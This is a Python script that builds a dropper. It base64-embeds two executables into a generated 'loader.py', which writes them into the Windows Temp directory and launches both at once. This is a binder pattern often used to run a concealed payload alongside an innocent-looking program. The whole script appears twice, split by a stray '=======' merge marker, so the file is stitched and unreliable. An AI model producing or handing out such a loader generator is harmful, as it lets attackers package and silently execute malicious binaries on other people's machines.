import os
import sys
import base64

def get_embedded_file_data(file_path):
    with open(file_path, 'rb') as file:
        return base64.b64encode(file.read()).decode('utf-8')

def generate_embedded_files_dict(file_paths):
    embedded_files = {}
    for file_path in file_paths:
        file_name = os.path.basename(file_path)
        file_data = get_embedded_file_data(file_path)
        embedded_files[file_name] = file_data
    return embedded_files

def generate_loader_file(embedded_files):
    loader_code = "import base64\nimport subprocess\nimport threading\nimport os\n\n"
    loader_code += "embedded_files = {\n"
    for file_name, base64_data in embedded_files.items():
        loader_code += f"    '{file_name}': base64.b64decode('{base64_data}'),\n"
    loader_code += "}\n\n"
    loader_code += """

def extract_and_run():
    temp_dir = os.path.join(os.environ['WINDIR'], 'Temp')

    for filename, data in embedded_files.items():
        file_path = os.path.join(temp_dir, filename)
        with open(file_path, 'wb') as f:
            f.write(data)

    def run_program(exe_name):
        exe_path = os.path.join(temp_dir, exe_name)
        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NEW_CONSOLE)

    for exe_name in embedded_files:
        print(exe_name)
        thread = threading.Thread(target=run_program, args=(exe_name,))
        thread.start()


if __name__ == '__main__':
    extract_and_run()
"""
    with open("loader.py", "w", encoding='utf-8') as loader_file:
        loader_file.write(loader_code)

    print("loader.py has been generated successfully.")


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python script.py <path_to_first_exe> <path_to_second_exe>")
        sys.exit(1)

    file1 = sys.argv[1].strip('"')
    file2 = sys.argv[2].strip('"')

    file_paths = [file1, file2]
    embedded_files = generate_embedded_files_dict(file_paths)
    generate_loader_file(embedded_files)
=======
import os
import sys
import base64

def get_embedded_file_data(file_path):
    with open(file_path, 'rb') as file:
        return base64.b64encode(file.read()).decode('utf-8')

def generate_embedded_files_dict(file_paths):
    embedded_files = {}
    for file_path in file_paths:
        file_name = os.path.basename(file_path)
        file_data = get_embedded_file_data(file_path)
        embedded_files[file_name] = file_data
    return embedded_files

def generate_loader_file(embedded_files):
    loader_code = "import base64\nimport subprocess\nimport threading\nimport os\n\n"
    loader_code += "embedded_files = {\n"
    for file_name, base64_data in embedded_files.items():
        loader_code += f"    '{file_name}': base64.b64decode('{base64_data}'),\n"
    loader_code += "}\n\n"
    loader_code += """

def extract_and_run():
    temp_dir = os.path.join(os.environ['WINDIR'], 'Temp')

    for filename, data in embedded_files.items():
        file_path = os.path.join(temp_dir, filename)
        with open(file_path, 'wb') as f:
            f.write(data)

    def run_program(exe_name):
        exe_path = os.path.join(temp_dir, exe_name)
        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NEW_CONSOLE)

    for exe_name in embedded_files:
        print(exe_name)
        thread = threading.Thread(target=run_program, args=(exe_name,))
        thread.start()


if __name__ == '__main__':
    extract_and_run()
"""
    with open("loader.py", "w", encoding='utf-8') as loader_file:
        loader_file.write(loader_code)

    print("loader.py has been generated successfully.")


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python script.py <path_to_first_exe> <path_to_second_exe>")
        sys.exit(1)

    file1 = sys.argv[1].strip('"')
    file2 = sys.argv[2].strip('"')

    file_paths = [file1, file2]
    embedded_files = generate_embedded_files_dict(file_paths)
    generate_loader_file(embedded_files)

